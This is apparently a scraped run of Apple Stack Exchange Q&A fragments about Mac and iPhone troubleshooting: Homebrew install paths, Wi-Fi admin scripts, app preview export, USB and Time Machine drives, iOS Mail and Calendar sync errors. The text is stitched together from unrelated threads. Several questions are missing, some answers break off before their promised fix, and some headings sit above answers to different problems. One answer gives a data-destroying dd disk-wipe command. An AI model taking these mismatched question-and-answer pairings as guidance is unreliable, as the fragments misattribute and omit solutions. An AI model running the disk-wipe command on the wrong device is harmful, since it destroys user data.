I had to bite the bullet and buy FCPX, this allowed me to export at all the resolutions and easily mod the aspect ratio's of the imported raw video.\n\nA: Here is a trick using just iMovie and Quicktime to get the right dimensions.\n\n\n*\n\n*Use QuickTime to record a short clip from the size of the device you need\n\n*Use iMovie and insert that clip into a new \"App Preview\" project\n\n*Add your actual video after the short clip\n\n\nNow, any clips that you export will be in the right dimensions. \nIf you need to hide your short clip, you can shorten it to 0.1 seconds. Put a title over it and delete the text. Now your video starts with 0.1 seconds of a black screen. \n\nA: Sometimes the \"Video in wrong format\" error has nothing to do with your video or format.  It's THEIR server.\nI had a video that uploaded fine one day and got the ERROR : \"Your app video preview is in the wrong format.\"  I did everything I could to tweak, check, change, re-export etc etc to fix it - thinking that it was me.

How can I do this?\n\nA: Just visit https://appleid.apple.com/account on mobile Safari and fill in the required fields.\n\n\nA: There are two things you can do:\n\n\n*\n\n*Recover it using iForgot using your email/security questions. This is the best thing to do if you forgot your password as it saves the hassle of creating a new one\n\n\nBear in mind you will need either your email or security questions available:\n\nNote:  If you forgot your security questions you need to use your email.

System Preferences/Networks/WiFi/Require authorisation to turn wifi on/off I'm hoping someone can help. I work for a college, I manage about 80 Macs and we've had a problem recently where students are turning WiFi on or off on the Macs that they're logging on to. This is bad for the hard-wired Macs as they haven't been provisioned on our managed Wireless system so it either slows down their network connection or kills it entirely and it's bad for the mobile Macs as they loose their connection to the network and they start whinging that they can't get on the internet. \nI found the following setting in System preferences which looks like it will solve my problem:\n\nDoes anyone know how to set this setting programmatically, using a script or a profile or whatever?\nI've found the plist which contains the setting, it is /Library/Preferences/SystemConfiguration/preferences.plist. However, the setting itself is buried quite deeply in the file and my attempts to toggle it using defaults write and plistbuddy have ended in horrible failure. I've also tried creating a custom profile using Profile Manager but that hasn't worked either.\nAll of the Macs are running Mavericks.\nI don't want to have to go around to 80 Macs and set this by hand so any hints or the solution would be greatly appreciated!\nThanks,\nIan\n\nA: See Toggle Ability to turn wifi off which shows how to do so from the command line using a script:\n#!/bin/sh\n\n# Get \"Wi-Fi\" or \"Airport\" based on your OS\nwservice=`/usr/sbin/networksetup -listallnetworkservices | grep -Ei '(Wi-Fi|AirPort)'`\n\n# Get port (usually en1)\nwhwport=`/usr/sbin/networksetup -listallhardwareports | awk \"/$wservice/,/Ethernet Address/\" | awk 'NR==2' | cut -d \" \" -f 2`\n\n# Set preferences\n/usr/libexec/airportd \"$whwport\" prefs DisconnectOnLogout=Yes JoinMode=Automatic JoinModeFallback=DoNothing RememberRecentNetworks=No RequireAdminIBSS=Yes RequireAdminNetworkChange=No RequireAdminPowerToggle=Yes\n\nThis question had been answered  previously, see Enable Admin Authorization to Change wireless Networks, also on jamfnation.

I had Internet Sharing working correctly on my iMac with OS X 10.9.4. I was sharing my connection from ethernet to computers using Wi-Fi.\nAfter I rebooted, my iPhone can connect to the Wi-Fi connection from the iMac OK, however has no internet access. I can access the iMac's local server pages, but not google.com etc.\nI have rebooted numerous times. What can I do to fix this issue?\nI am behind a cooperate proxy which settings are set correctly.\n\nA: The best option here is to speak to your employer's technical support people.\nIf their policies permit the sharing of the wired corporate network to wireless devices they should assist you in setting up the connection or at least point you in the right direction.\nIf they do not, then it is probably best not to breach their policies.\n\nA: Have you excluded a DNS issue. Can you connect to an external site using the IP address, instead of the resolved name. Can you try and open http://173.194.45.48 instead of http://www.google.com? If this works, the DNS on your iPhone is somehow screwed.\nAssuming you can connect outside your mac using an IP check the DNS settings in the networking panel of both the mac sharing and the iPhone receiving the shared connection\n\nA: Didn't get to the bottom of this, i installed Charles Proxy for OS X and on each devices settings i set the proxy details to be that of the mac when running internet sharing. worked a dream.. \n\nA: Mine turned out to be a DNS issue. Before figuring it out, I tried lots of other troubleshooting (turning Internet Sharing on/off, restarting all computers, deleting network interfaces). Here's how I fixed it:\n\n\n*\n\n*My Mac Mini is running Internet Sharing.\n\n*My MacBook Pro (MBP) is connected to the Mac Mini.\n\n*The MBP could connect to internet content, but not to external content. If could connect to Google in Safari by using Google's IP address (for me it was 216.58.218.174).\n\n*This let me know I had a DNS problem.\n\n*On the MBP, I opened System Preferences / Network / Wi-Fi.\n\n*Clicked on Advanced and went to DNS.\n\n*The address for my Mac Mini was listed as the DNS Server. I instead entered the address of my internet router box that actually connects me to the internet.\n\n*Once I hit OK, my MBP was able to connect to everything again like normal.\n\n\n\nUPDATE\nThe steps I outlined above fix the problem for the single client computer. If you have multiple devices (like your iPhone) connecting to the Mac Mini, you'll have to apply similar steps to each device.\nMy Mac Mini happens to have OS X Server running on it, so I was able to fix the problem at the source. I turned on the DNS server and told it to forward DNS requests to my internet router's IP address. That fixed the DNS issues for all devices that connect to Internet Sharing.\n", "Q: Exists such thing as mozrepl for Safari?

(It was purchased in December 2012, pre-Mavericks. It was recently wiped and replaced with an image that I'm guessing already had iWork installed.)\nEvery day the App store bugs me about installing updates.

Any ideas?\n\nA: The short answer is it depends... most apps will store it in ~/Library/Preferences/.  For example, on Mavericks the Preview recently used list is in ~/Library/Preferences/com.apple.Preview.LSSharedFileList.plist\nYou can use the terminal/commandline plutil to see what's in there: plutil -p ~/Library/Preferences/com.apple.Preview.LSSharedFileList.plist\nIf you want to get into the nitty gritty of modifying the file (outside the scope of this question, but what the heck), man plutil.\nFor syncing this file, you may find that there is other config info in there, I'm really not sure.  You'll want to make sure it's sane to do before pulling the sync trigger.  I'd suggest manually copying this a few times to make sure you understand what happens to the app if its files change while it's still running, etc.\nI think you'll definitely want to stay away from syncing the whole directory since it would be possible to get into a loop where each application is trying to write to the file and dropbox is non-stop trying to propagate the changes across as each app competes for what's \"correct.\"\n\nA: I found the one I was looking for under:\n~/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments\n\n", "Q: What features in iOS 8 make a difference?

I'm on a mid 2010 15 inch mbp. I just noticed that, even after my computer has been off for a few days, coins are sticking to the back of the display - in the exact area of the speaker next to the built in camera (is that a speaker or a mike?)\nI assumed that once my computer's been off for a long time, any type of magnetic fields will be long gone (and definitely not strong enough to move nearby coins!). Is it possible for this to occur, or should i look into some sort of problem (ie, the speaker/mike and/or camera staying on after my laptop has been powered off or put to sleep)\n\nA: Loudspeakers use permanent magnets, unaffected by electricity. \nIf you pass an alternating current through a coil of wire, it will induce a magnetic field in the coil. If you put 2 magnets in close proximity, opposite poles will attract, similar poles will repel. Conversely, if you move a coil of wire near to a magnet, it will generate electricity.\nThis is the basic principle of loudspeakers & microphones, massively over-simplified.\nFull overkill explanation can be found on Wikipedia - http://en.wikipedia.org/wiki/Loudspeaker\nAlso, basic principles at http://en.wikipedia.org/wiki/Electromagnet\n\nA: The microphone and speakers on Apple laptops are located in the lower case, not in the display.

At the moment there is no other way to close all tabs at once.\n\nA: Another thing I've found is to use multiple fingers to push as many x's on the corners of the windows as I can simultaneously. This still isn't as handy as the close all button was.\n\nA: in Safari iOS 10 you can close all tabs by holding down the tab button \nhttps://www.igeeksblog.com/how-to-close-all-safari-tabs-at-once-in-ios-10/\n\nA: You can swipe tabs to left. Not all at once, but still quicker\n\nA: If you are using a Mac and have iCloud configured you can open Safari on your Mac and choose \"View\" -> \"Show All Tabs\". Now you'll see all open tabs on your iPhone and can quickly click on the \"x\" to close a tab on your phone.\n\nA: Go to the icon at top right of screen (when on Safari)it is like one oblong on top of another tap it and the screen will shrink, you will then see the close cross on top left hand corner,tap this cross,and bingo job done.\n", "Q: What is the maximum resolution for using two external monitors with a Macbook Pro 15\" Retina?

I'm trying to get two displays on my MBP 13\" mid 2012, apparently it supports two daisy chained Apple TB displays, but i can't fork out £1600 for two Apple TB displays, so after a weekend of searching, here are my alternatives:\n\n\n*\n\n*A mini dp to hdmi (first monitor) the usb to hdmi/vga/dvi (second monitor), problem here is the usb adapters for mac are just not good enough for me.\n\n*Using an adapter like the Matrox DualHead2Go Digital SE, to split the mini displayport to two outputs, problem here is the macbook sees both monitors as one big monitor, which isn't what I'm looking for.\n\n*Utilize the thunderbolt daisy chaining, using the Elgato thunderbolt dock (which has an hdmi port) connected to the MBP's TB port, you can connect an HDMI display, and then connect the Elgato Thunderbolt Dock to another Elgato Thunderbolt Dock via a Thunderbolt cable. Then, the second Elgato Thunderbolt Dock can connect to a display via Thunderbolt™, HDMI or DisplayPort. Basically using two TB Docks, so you have\nMBP -> Elgato TB dock with hdmi (first monitor) -> second Elgato TB Dock with hdmi (second monitor)\nThe third option will do what I want, but I don't want to have to buy two docks. Hence, I've been trying to find a thunderbolt device that supports daisy chaining for a price range of less than £100, the closest I got was the Belkin thunderbolt dock but that goes for £154.\nI don't really care what the device does I just want to be able to daisy chain my Thunderbolt port from my current dock and attach a second monitor to the chain, i.e. MBP -> TB Dock with hdmi (first monitor) -> a cheap daisy chainable device -> mini displayport to hdmi (second monitor).\nI would also appreciate any other suggestions on achieving dual independent displays for  my MBP (just in case I've missed something).\n\nA: I have recently run into a similar situation as yours. Both of the proposed solutions below do not use expensive gear like thunderbolt docks or monitors, and can achieve the same (or similar) desired end result.\n\n\n*\n\n*This Thunderbolt-to-Dual-HDMI adapter allows your to connect two 1080p monitors to a single Thunderbolt port, and have both those monitors act independently from one another (ie. they are not mirrored). The adapter is also passive, which is nice.\n\n*Buy a Chromecast. This solution is sub-optimal, and is dependent on you having a decent internet connection, but with this $35 device, you can stream a browser tab, your desktop, audio, video, and more to an external monitor. The third monitor can then be added with a simple Thunderbolt-to-HDMI adapter.\n\n\nA: I use one of these: http://www.amazon.com/dp/B00BUC3M2K/ref=pe_385040_121528360_TE_dp_1\nIt's not perfect, but it works good enough for me.

But I can not find where they are.\nI can not get access by typing hping on terminal\n% brew install hping\n(git)-[master] \nWarning: hping-3.20051105 already installed\n\n\nA: To figure out where your formula is installed, do\nbrew --prefix hping\nYou can also relink your hping binary by doing brew unlink hping && brew link hping\nAlso maybe your $PATH is not well defined. Does the list given by echo $PATH contains the result given by echo $(brew --prefix)'/bin:'$(brew --prefix)'/sbin'? This path should be toward the beginning of the list to be prioritized over system binaries, surely before /usr/bin.\nTo do so, you can add this at the end of your ~/.zshrc or ~/.bashrc:\nexport PATH=$(brew --prefix)/bin:$(brew --prefix)/sbin:$PATH\n\nAs a result, after opening a new terminal or doing source ~/.zshrc, you'll be able to echo your correct path as:\n$ echo $PATH\n/usr/local/bin:/usr/local/sbin:/usr/bin:/bin:/usr/sbin:/sbin\n\n\nA: To find your base installation directory for Homebrew, use one of the following commands:\nbrew --prefix\nbrew --cellar\n\nThe latter specifically returns the path of your Cellar folder.\n\nA: Inspired by @RubenLaguna, I came up with this to get the full path to the installed version of the default formula.\nAs shown in previous answers, to get the install path for a formula:\nbrew --prefix nmap\n\nReturns a symlink to the install path:\n/usr/local/opt/nmap\n\nTo expand the full path:\nreadlink -f $(brew --prefix nmap)\n\n/usr/local/Cellar/nmap/7.92\n\n\nA: The /usr/local/Cellar directory is the default location on OS X. You'll see sub-directories in there for all your installed formulae.\n\nA: I couldn't find any direct CLI option in brew to get the full path to the currently installed version of a formula but this would work as long as you are using bash:\necho $(brew --cellar asciidoctor)/$(brew info --json asciidoctor | jq -r '.[0].installed[0].version')\n# /usr/local/Cellar/asciidoctor/1.5.8\n\n\nA: Use the following to show the installation path of a package:\nbrew info hping\n\nExample output:\npcre: stable 8.35 (bottled)\nhttp://www.pcre.org/\n/usr/local/Cellar/pcre/8.35 (146 files, 5.8M) *\n  Poured from bottle\nFrom: https://github.com/Homebrew/homebrew/blob/master/Library/Formula/pcre.rb\n==> Options\n--universal\n    Build a universal binary\n\n\nA: Try this command\nbrew --cellar <FORMULA>\n\ne.g.\nbrew --cellar hping\n\n\nA: Normally, homebrew installs packages into /usr/local/bin. So you need to check that your PATH contains that directory, like this:\necho $PATH\n\nAlso, try running\nbrew doctor\n\nto make sure your setup is correct. If /usr/local/bin is not in your PATH, you need to edit ~/.profile and add a line like this:\nexport PATH=$PATH:/usr/local/bin\n\nThen start a new Terminal (in order to re-read your login profile) and try again.\nIf all that fails, it must be installed somewhere else. You can search for it by running a command like this:\nsudo find / -name hping -type f\n\n\nA: I recommend adding the following line to your ~/.bash_profile (or the equivalent configuration file if you are using a different shell):\nexport HOMEBREW_CASK_OPTS=\"--appdir=/Applications\"\n\n\nA: hping requires root privileges to run.\nYou probably need to add /usr/local/sbin to your PATH.\nWhen I ran brew doctor:\nWarning: Homebrew's sbin was not found in your PATH but you have installed\nformulae that put executables in /usr/local/sbin.\nConsider setting the PATH for example like so\n    echo 'export PATH=\"/usr/local/sbin:$PATH\"' >> ~/.bash_profile\n\n\nA: \nI installed some packages via brew. But I can not find where they are.\n\nIt seems that homebrew requires one to be explicit with things.  Fortunately, a bit of escaping using brew --prefix can make this a no-brainer, for those who need to find the path for the pkg-config utility, e.g.\nPKG_CONFIG_PATH=`brew --prefix hping`/lib/pkgconfig/ pkg-config --cflags hping\n\n(Except this isn't going to work anyway, because it seems hping doesn't come with hping.pc .. although, in the case where package maintainers do put .pc files, this trick can be useful.)\n\nA: If someone looking for real path of package:\nIn my case brew --cellar opencv3 gives /usr/local/Cellar/opencv\nBut find /usr/local/Cellar/ -type d -name \"*opencv*\" -maxdepth 1 gives \n/usr/local/Cellar//opencv3(which is /usr/local/Cellar/opencv3 actually).\nHeaders:\n/usr/local/Cellar/opencv3/3.4.1_1/include/\nLibs:\n/usr/local/Cellar/opencv3/3.4.1_1/lib/\n\nA: For anyone that lands here after googling, and/or for anyone who wants a list of packages that are installed as keg only, you can get this info from the brew JSON output.\nList all installed packages:\nbrew info --json --installed\n\nList keg only packages (jq tool required):\nbrew info --json --installed | jq -r '.[] | select(.keg_only == true) | .name'\n\nList the path for keg only packages (again, jq tool required):\nbrew info --json --installed | jq -r '.[] | select(.keg_only == true) | .name' | while read name; do brew --prefix $name; done \n\n\nA: The real path to the directory containing versioned directories of the formula\nbrew --cellar <FORMULA>\n\nExample\n% brew --cellar spdlog            \n/usr/local/Cellar/spdlog\n\nSymlink to the current version of the formula (shorter)\nThis is what you want most of the time.\nbrew --prefix <FORMULA>\n\nExample\n% brew --prefix spdlog         \n/usr/local/opt/spdlog\n\n\nA: brew list opencv\n\nOutput like this:\n/usr/local/Cellar/opencv/4.5.2_4/bin/opencv_annotation\n/usr/local/Cellar/opencv/4.5.2_4/bin/opencv_interactive-calibration\n/usr/local/Cellar/opencv/4.5.2_4/bin/opencv_model_diagnostics\n...\n\nMy brew version:\nbrew -v\n> Homebrew 3.2.1\n\n", "Q: How make snoozing iphone alarm go away for today? Very often by the time I get tothe phone it's lock screen is already on and black so when i wake it up the alarm goes to snooze and i have not found any way to disable the alarm for today unless I go to the alarm settings and switch it off and on again. \n\nA: As you already know, if you unlock your phone while the alarm is going off, the alarm is acknowledged and won't sound again until the next day.\nIf the alarm is snoozing, it seems that the only way to prevent it from going off again is to manually turn it off (and on) again. The only help I can offer is recommending that you unlock the phone by sliding the clock icon where it says \"Snoozing\" on the lock screen, as that will at least take you directly to the alarms menu.\nI imagine that they have this obstinate functionality because people might use alarms for other purposes than waking up, and they might be using their phones for other things and perhaps don't see the alarm.\n\nA: Everybody is missing the point. He said that, by the time he got to the phone, it was already black. Swiping doesn't work. Hitting buttons doesn't work. I know. It happens to me. The one thing you can do is to tell Siri to turn off all your alarms. That works 9 out of 10 times for me, but sometimes it doesn't. I think it would be nice if the phone didn't go black so fast. Then you could pick it up and swipe to the right.\n\nA: Instead of swiping the snooze to the right like you would if unlocking, swipe to the left, then push the x.  Done\nBefore swiping, the screen will look like this:\n\nAfter swiping left on the \"Snoozing\" message, you should see:\n\nClicking on the small cross should then cancel the alarm. \n\nA: Try restarting the phone.

Of course my phone cannot access the Internet using the wifi network because the network is not connected to the Internet.

I am running OS X 10.9.4. I am trying to preserve space on my OS SSD.\n\nA: The symbolic link method described by Dave Nelson will do exactly what you asked for. \nHowever, I use a different method. \n\n\n*\n\n*\"Documents\" folder is for Application managed files\n\n*My own folders for files I organize based on Projects\n\n\nI create my own document folders that I can place anywhere. For example, I have \"Personal\", \"Business\" and \"Archive\" setup as folders for documents in my Home Folder. \"Personal\" and \"Business\" are both normal folders residing on my internal SSD, and the \"Archive\" is a symlink to an external drive. I place these folders in my Finder's Sidebar so that I have fast access to them from the Finder and File Dialogs. \nThe only files in the \"Documents\" folder come from those automatically created by various applications and which I will only use within the specific application. For example, my \"Documents\" folder contains:\n\n\n*\n\n*iChats & Colloquy transcripts folders\n\n*Microsoft User Data\n\n*Quickbooks and other Financial software data\n\n\nAll of these files I never access outside of the context of the creating Application and there is no advantage to grouping them with other files (such as being related to the same project.) Some of these Applications would allow me to move their data to another location, but others require their data to be in the Documents folder. Many of the files that are located in my \"Documents\" folder could have been placed in the \"Library\" folder by the creating application. I think the MS User Data folder is not placed in the \"Library\" for historic reasons dating back to Classic Mac OS. \nUsing this method, my Documents folder contains less than 200MB which for me is acceptable on my internal SSD. \nNote: I don't use Microsoft for email otherwise the MS User Data folder would be huge. Additionally, I move my VMWare Virtual Machines folder out of the Documents folder. \n\nA: There are many web pages that will walk you through this process, here is a good one:\nhttp://www.maclife.com/article/howtos/how_move_your_documents_folder\nBasically you create a symbolic link to a folder on an external drive.\nHere is information on how to use the console to create a symbolic link:\nhttp://hints.macworld.com/article.php?story=2001110610290643\nAnd here is my take on it:\n\n\n*\n\n*Attach external drive\n\n*Copy your Documents folder from your Mac to the external drive\n\n*Rename the Documents folder on the Mac to Documents-old\n\n*Open Terminal\n\n*Type in cd /Users/Your User ID/\n\n*Then ln -s /Volumes/External Drive Name/Documents Documents\n\n*Test it out for a while to verify that it works, when you are happy with it you can delete the Documents-old folder from the Mac\n\n", "Q: Where does homebrew download software from?

My twitter and facebook app do not longer have the sound on the iPad Air? The other apps all have sound. \nWhats up with that?\n\nA: For Facebook:\nFirst make sure this is done so that you can go on to the actual solution. Facebook push notifications are controlled inside the actual Facebook app under “Account Settings>Notifications”. They are NOT controlled under the iOS “Settings>Facebook>Settings>Notifications”, if you go there you will be directed to the actual Facebook app.\nNow it’s time for the solution to the problem.

I am trying to understand how the continuity and handoff features work and what is the difference between them. I suppose handoff is for specifically transferring activities from one device to the other while continuity is being able to answer call from mac or reply to messages. Although the difference is quite small. \nSo how exactly do these work ? do they use the same multi peer connectivity framework ? And are these only available to devices with the wifi-direct chip ( 4s and above )?\n\nA: I can't embellish on the technical aspects of Continuity and Handoff beyond the WWDC bullet points, but I'll do my best to answer.\n\"Continuity\" is the name of the new feature-set included in OS X 10.10 (Yosemite) and iOS 8 to allow more seamless integration with devices.\n\"Handoff\" is the name of a specific feature in which a task started on one device can be picked up - or handed off - to another device to finish or continue.\nContinuity also includes features such as phone call and SMS relaying as well as Instant Hotspot.\nAnd yes - these features will not only work between OS X and iOS devices, but two or more iOS devices as well; Just today I accepted a call on my iPad. All of this is done with Bluetooth, and only devices with Bluetooth 4.0 can utilize them.\nAnd for your technical question (which is above my head at this point in time) can most likely be answered here: \nhttps://developer.apple.com/library/ios/documentation/UserExperience/Conceptual/Handoff/HandoffFundamentals/HandoffFundamentals.html#//apple_ref/doc/uid/TP40014338\n", "Q: Does the camera on the iPhone 6 protrude from the back?

Without any apparent reason the MBP just wouldn't boot from the SSD anymore, reinserting the old HDD worked instantly.\nAfter playing around a bit I made the following observations about the MBP:\n\n\n*\n\n*won't boot from the SSD even after cloning the HDD or making a clean reinstall\n\n*not even able to get to the boot menu when the SSD is installed\n\n*can boot from the SSD when it is connected via USB and the HDD is used to get to the boot menu\n\n*cannot boot from any other SSD (tried one from another MBP and also a completely new one)\n\n\nAny ideas?\n\nA: I don't know how it worked without issues for over a year... but the culprit is probably the drive cable. To put a long story short, the interface is SATA III on the motherboard, it's SATA III on the SSD, so they will talk SATA III.\nBut if your MBP shipped with a SATA II HDD, it most likely came with an interconnect cable only rated for SATA II.\nI wouldn't have thought this would be that big of an issue (I sort of thought the difference was like the difference between a CAT 5 and CAT 5e UTP) but apparently with the models of SSD's on the market right now and their throughput, it causes an issue. \nI couldn't tell you how to determine if the cable's the \"updated\" SATA III version or not when shopping for parts, but I do know that this one is.\n", "Q: dd ruined my USB stick, how do I recover? I tried to copy a Linux distro over to my USB using DD.

I've plugged it into a Windows box, and ran Diskpart, but it's saying the volume is 0 bytes.\nI've tried to get it to show in Linux and Mac to no avail. The issue happened when using dd on my macbook, hence why I've asked on Apple SA.\nAny advice on what to do from here? I recall I had a similar issue in the past but don't know how to fix it.\n\nA: I'm assuming there is nothing on the USB stick you need to recover, since you were writing over it with dd.\nPlug it into your macbook and if it shows up with in /dev as a proper device, you should be able to use dd to clear the beginning and end of the stick to make it look like a brand new USB stick.\ndd if=/dev/zero of=/dev/disk__ bs=1024 count=100\nwill clear the beginning of the stick. (Be absolutely sure that you have the correct device id for the \"of=\" parameter !! Make sure it wasn't there right before you inserted the USB stick into the computer.) \nHowever, there may be a GPT partition at the end of the stick. To write to the end, you'll probably want to use seek= with the number of blocks on the device minus 50 or so. \nOnce those are cleared, you should be able to add a new partition table to the USB stick using the disk utility.\nIf that doesn't work, using the first form without \"count=100\" would overwrite the whole stick with zeros. That's probably overkill, but at that point any system should recognize it as a new device\n", "Q: My iPhone 4 is not showing me on my text message when I have a message My iPhone is not showing me when I have messages on the Messages app, and is also not ringing when I have text messages even though my settings are set to alert me when I get one.\n\nA: thanks for the question.\nWhen you say messages are these SMS (green speech bubbles) or iMessage (blue speech bubbles)? Or both? These are both read inside the message app on the iPhone.\nIf it is the SMS you may have a carrier glitch - if it is the blue you may have an issue with your Apple ID.\nIf you haven't already - the first port of call for all iPhone troubles is to do a soft reset - this is different to turing off and then on.

For some strange reason, the external Western Digital Passport Drive I've used for Time Machine on my old Mac doesn't seem to work on the new one.\nNo icon shows up on the desktop. Disk Utilities doesn't show the disk. I've tried it in all three USB ports. No luck.\nIt sometimes shows up in system reports. When I plug the drive into a USB port, I get information from the Console App:\n\n9/16/14 9:32:13.000 PM kernel[0]: The USB device Apple Internal Keyboard /     Trackpad (Port 5 of Hub at 0x14000000) may have caused a wake by issuing a remote wakeup (2)\n\nDead Drive? No, it works just fine on my older MacBook Pro 2009 model.\nThe only thing I can think of is that my older model had USB 2 ports while the newer Mac uses USB 3 ports. The port on my drive is a USB 3 port. Maybe formatting the drive via USB 2 makes it impossible to use for USB 3?\n\nOne More Thing...\nI didn't mention this earlier because I forgot. Whoops.\nThe drive is encrypted, and I need a password to open it. On my old MacBook, if I hold down the option key while booting, I can put in a password for the drive, and I see the various partitions (There is the TimeMachine partition, a Yosemite Beta partition, and a Yosemite Emergency Boot Partition).\nIf I put this on my 2009 MacBook Pro, it simply shows up. If I put this on my wife's iMac (2012), I have to put in the password, but it mounts fine.\nOn my new MacBook Pro, I don't see it (or am I offered an option to enter a password) if I hold down the option key when I boot the system.\nAlso, a question came up about the OS:\nThe old MacBook is running a beta of Yosemite. It was running Mavericks and it would be the same release and version of the one on the new MacBook Pro. However, the drive crashed, and I was forced to initialize and format, and install Yosemite since that's the only emergency boot item I had.\nIt's the reason I decided I needed a new MacBook Pro. The new MacBook Pro and my wife's iMac are both running the same version of Mavericks. The old MacBook Pro was running the same version of Mavericks and using the WD disk before it crashed.\nThis isn't a terrible emergency. I had put my Documents folder on Dropbox, so all of my documents were backed up to Dropbox. Other docs were in iCloud. Almost all of my apps were from the Mac App store (except for some open source tools). My mail is IMAP. The only thing on the WD I didn't have were iPhotos that weren't in iCloud. (Which makes me wonder if Time Machine is still all that important).\n\nA: Are both MacBooks running the same version of Mavericks? WD had a fiasco with their applications, kernel extensions, etc. being incompatible with Mavericks, which led to massive customer data loss. You might need to update the drive's firmware and erase every trace of WD SmartWare, etc. on the drive and possibly even on the new MacBook, as their crapware can self-install in some instances.\n\nA: The cable is bad. It works in USB2 devices, but not USB3 devices. I took it to the Genius Bar, and using that cable in a new MacBook Air had the same problems. The Genius Bar had a USB3 cable, and using that one worked. Unfortunately, Apple Stores don't sell USB cables, so I have to see if I can round one up.\n", "Q: How to set the iphone mail app to send email only I use my gmail as my primary email address and use the gmail app on my iphone.\nHowever, whenever I want to send a picture quickly from my camera roll it uses the default mail app and then proceeds to download all the emails it perceives as unread.  All this mail is already in my gmail app,filed to read as I like.\nIs there any way to set the ios mail to send only?\nThanks \n\nA: You can setup iOS to send only, you just have to fool it :)\nHere is how I did it on iOS 7...\n\n\n*\n\n*If you have an existing GMail account setup in iPhone Mail, delete it.\n\n*Go to Settings > Mail, Contacts... > Add Account\n\n*From the list of choices, select Other\n\n*Select Add Mail Account\n\n*Fill in your details for your mail account, press Next\n\n*Choose POP instead of IMAP\n\n*For Incoming Mail Server I used dummy info like\n\n*\n\n*Server: blah.gmail.com\n\n*User Name: blah\n\n\n*For Outgoing Mail Server I used the proper settings\n\n*\n\n*Host Name: smtp.gmail.com\n\n*User Name: \n\n*Password: \n\n\n*Press Save\n\n*\n\n*If it asks to save without SSL answer with NO\n\n\n*Press Save again!\n\n*\n\n*It will warn you that it may not work. Confirm save.\n\n\n*Go to Settings > Mail,Contacts,... > 'your account' > SMTP > Primary Server\n\n*Verify SSL is on\n\n*Change Server Port to 587\n\n*Press Done and exit to Accounts.\n\n\nThat is it! You can now send emails and if you open the mail app it will complain because of the dummy Incoming Server.\nAlso check that you have the Settings > Mail,Contacts....> Fetch New Data settings to off/manual.\nHope that helped.\n\nA: The good answer by Vic above almost did it for me, but it made me realize there is this method too, which disables incoming mail by using the disallowed non-ssl:\n\n\n*\n\n*Add your gmail account as per normal if needed.\n\n*Go to Mail in Settings, to your Account, then Advanced and finally switch off Use SSL\nunder INCOMING SETTINGS.\n\n\nThis cancels the ability for normal mail fetching to happen.\nYou will have to press Done/Save again after the error pops up about imap not working etc\n", "Q: Error popups from Apple Calendar application I am using Macbook running Mavericks OS. \nRecently I hace synced my Google calendar with Apple calendar in my Mac, but then I regularly get this error message:\nThe server responded with an error.\nThe request for “International Observe the Moon Night” in “kixxxxxxx@gmail.com” in account “Google” failed.\nThe server responded with\n“400”\nto operation CalDAVWriteEntityQueueableOperation.\n\nI believe many others have got this error message.\nCan someone tell me how to resolve this? \n\nA: *\n\n*Close the Calendar Program\n\n*Remove the two caches (Or squirrel them away someplace, just in case.)\n\n\n~/Library/Calendars/Calendar Cache\n~/Library/Caches/com.apple.iCal\n\n\n*Open Calendar and wait for it to synchronize.\n\n\nThis takes care of most problems that are do to some sort of caching issue.\n[For Advanced users]\nIf that doesn't work, you can disconnect from the networked accounts, export backups of you local calendars (make sure you have good solid backups of everything!), then move ~/Library/Calendars out of the way. Start Calendar, restore your local calendars, and re-connect your network calendars. Once everything synchronizes, your calendars should be clean.\nIf you continue to have issues, you may have to be patient and wait for Google to fix an issue with their servers.\n\nA: I got this same error when copying and pasting my husband's flight departure iCal item to the date that he was returning. I had just planned to change the word \"departure\" to \"arrival\" in the event to save time rewriting all the info. Boy was I bummed when this error showed up. \nI looked at many many answers to this issue and was chagrined to see things about moving files, deleting files, backing up my calendar, reinstalling Yosemite (FYI: I'm on 10.10.3 on a MacBook Air). \nHere are the key words associated with my error that will hopefully help people search and find this later: Error \"400\" to operation CalDAVWriteEntityQueueableOperation \nHere's what I did that finally worked. Repeated the process because I accidentally triggered the server error again when I clicked on the offending iCal item that started the whole mess (it was there, so I thought I'd edit it). \nI am going to speak from the viewpoint of a non-technical person (that's me, kind of. I'm a technical marketing copywriter):\n\n\n*\n\n*With iCal open, and the popup message with the server error and all the text below that's associated with the \"offending\" iCal item, do a select all (Command+A). This lets you select even the text below the bottom of your screen... important text to select). \n\n*Copy and paste the entire message into a word doc.  \n\n*At the very bottom of the message, you'll see that it has a problem with one of your iCal calendars (e.g., I have these: work, home, kid calendar, school). For me, the problem was noted as being in my \"work\" calendar. Makes sense, as this is my default calendar, and I have to assign a different calendar if I want to add an iCal event to my home or kid calendar... you get the gist). \n\n*Force quit iCal to close it (if you don't know how to force quit, you do it by pressing alt+command+esc, selecting iCal from the list of open apps that appears in the popup, and clicking the Force Quit button).\n\n*Open System Preferences > Internet Accounts > iCloud.\n\n*Select iCloud in the left side list. Things associated with iCloud show up to the right.\n\n*In the list to the right, uncheck the Calendars checkbox. (I also unchecked reminders and contacts just in case). \n\n*Reopen iCal. You'll see that all your iCloud calendars are gone. You'll still see calendars under \"Other\", which include for me US holidays and Birthdays.\n\n*If it's not still open open, repeat step 5 to open the iCloud window in which you unchecked \"Calendar.\" Sorry I don't know the official name for that window.\nBEFORE YOU DO ANYTHING ELSE, READ STEPS 10 THROUGH 12 BECAUSE YOU HAVE AROUND 5 SECONDS TO COMPLETE THOSE STEPS BEFORE THE ERROR MESSAGE POPS UP AGAIN AND YOU HAVE TO REPEAT STEPS 4-9.\n\n*Before the server error message pops up again, you need to do these things:\n\n*Click the Calendar checkbox to turn it back on.\n\n*Quickly uncheck the box next to the calendar that has the offending item. \nPHEW. NOW YOU CAN RELAX.\n\n*Click once on the name for that same calendar (the one you turned off). Then click it again to be able to rename it. Rename it with a different name. I renamed mine \"Work2\".\n\n*Click the checkbox next to the renamed calendar. It turns on all the items associated with that calendar and the error message does not pop up any more. Unless, of course, you select it and spend time trying to do something with it.\nONCE AGAIN, DO THIS QUICKLY... BEFORE ERROR MESSAGE POPS UP. \n\n*Quickly select the offending iCal item that you were creating when your issues started and hit delete.\n\n\nProblem solved for me! I hope it works for you!\nBTW, no loss of data, calendar items, etc occurs by just switching off your iCloud Calendars. I was unable to export or backup my calendars (that option was grayed out for me), so this resolution seemed like my only option other than manually writing down all my calendar items. \n\nA: See three possible techniques below.\nTechnique 1:\nTaking hints from above, in Yosemite after re/moving ~/Library/Calendars/Calendar Cache I have to re-add a CalDav Account using hints from their support page https://support.google.com/calendar/answer/99358?hl=en to fix Calendar.app's Accounts listing.\nFor some reason all the accounts disappear and the Add button prevents me from adding a Google account. After typing the password and pressing 